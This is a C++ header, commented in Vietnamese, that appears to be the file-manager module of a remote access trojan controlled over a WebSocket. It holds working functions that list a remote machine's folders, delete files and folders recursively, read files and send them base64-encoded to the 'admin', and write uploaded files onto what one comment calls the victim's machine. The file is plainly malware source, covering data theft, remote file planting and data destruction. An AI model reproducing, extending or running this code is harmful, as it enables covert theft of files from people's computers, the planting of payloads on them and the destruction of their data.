#pragma once
#include "global.h"
#include <filesystem>
#include <fstream>
#include <vector>
#include <iomanip>
#include "lib.h"
#include "encode.h" // Bắt buộc để xử lý tiếng Việt

namespace fs = std::filesystem;

// Helper: Base64 Encode/Decode
static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

std::string base64_encode(const std::string &in) {
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

// Chức năng: Liệt kê thư mục
void handle_list_directory(std::shared_ptr<websocket::stream<tcp::socket>> ws, const std::string& pathUtf8) {
    json files = json::array();
    try {
        // [FIX] Convert đường dẫn từ UTF-8 (Web) sang Wide String (Windows) để đọc đúng tiếng Việt
        std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);

        if (fs::exists(wPath) && fs::is_directory(wPath)) {
            for (const auto& entry : fs::directory_iterator(wPath)) {
                try {
                    json file;
                    // [FIX] Convert tên file từ Wide String về UTF-8 chuẩn cho JSON
                    file["name"] = WinEncoding::ToUtf8(entry.path().filename().wstring());
                    file["is_dir"] = entry.is_directory();
                    
                    // Lấy size an toàn (tránh lỗi permission)
                    try {
                        file["size"] = entry.is_directory() ? 0 : entry.file_size();
                    } catch (...) {
                        file["size"] = 0;
                    }
                    
                    // Xác định loại file
                    if(entry.is_directory()) {
                        file["type"] = "Folder";
                    } else {
                        // [FIX] Lấy đuôi file chuẩn UTF-8
                        std::string ext = WinEncoding::ToUtf8(entry.path().extension().wstring());
                        // Normalize ext (có thể thêm toLower nếu cần)
                        if(ext == ".exe" || ext == ".dll") file["type"] = "Application";
                        else if(ext == ".txt" || ext == ".log" || ext == ".ini" || ext == ".cfg") file["type"] = "Text";
                        else if(ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".bmp") file["type"] = "Image";
                        else if(ext == ".cpp" || ext == ".h" || ext == ".js" || ext == ".html" || ext == ".css") file["type"] = "Code";
                        else file["type"] = "File";
                    }
                    files.push_back(file);
                } catch (...) {
                    // Nếu 1 file bị lỗi (ví dụ tên quá dị), bỏ qua file đó, không crash cả folder
                    continue;
                }
            }
        }
        
        // [FIX] dump() nằm trong try-catch để bắt lỗi JSON
        sendMsg(*ws, "file", "DirectoryList", files.dump());

    } catch (const std::exception& e) {
        // Gửi lỗi Access Denied về client thay vì ngắt kết nối
        json errorItem; 
        errorItem["name"] = "[ERROR] Access Denied: " + std::string(e.what()); 
        errorItem["is_dir"] = true; 
        
        json errArray = json::array();
        errArray.push_back(errorItem);
        
        try {
            sendMsg(*ws, "file", "DirectoryList", errArray.dump());
        } catch(...) {}
    }
}

// Chức năng: Xóa file/folder
void handle_delete_file(const std::string& pathUtf8) {
    try {
        std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
        if (fs::exists(wPath)) {
            fs::remove_all(wPath);
        }
    } catch (...) {}
}

// Chức năng: Tải file về máy admin
void handle_download_file(std::shared_ptr<websocket::stream<tcp::socket>> ws, const std::string& pathUtf8) {
    try {
        std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
        
        // [FIX CHO MINGW] Chuyển std::wstring sang std::filesystem::path tường minh
        // MinGW ifstream không chấp nhận std::wstring trực tiếp
        std::ifstream file(fs::path(wPath), std::ios::binary);
        
        if (!file.is_open()) return;
        
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        std::string encoded = base64_encode(content);
        
        json j;
        j["type"] = "file";
        j["what"] = "FileDownload";
        j["message"] = encoded;
        // Gửi tên file gốc về để client lưu
        j["filename"] = WinEncoding::ToUtf8(fs::path(wPath).filename().wstring());
        
        ws->write(net::buffer(j.dump()));

    } catch (...) {}
}

// Chức năng: Upload file từ admin lên máy nạn nhân
void handle_upload_file(const std::string& pathUtf8, const std::string& filenameUtf8, const std::string& b64data) {
    try {
        std::string decoded = base64_decode(b64data);
        
        std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
        std::wstring wFilename = WinEncoding::FromUtf8(filenameUtf8);
        
        fs::path full_path = fs::path(wPath) / wFilename;
        
        std::ofstream file(full_path, std::ios::binary);
        file.write(decoded.data(), decoded.size());
        file.close();
    } catch (...) {}
}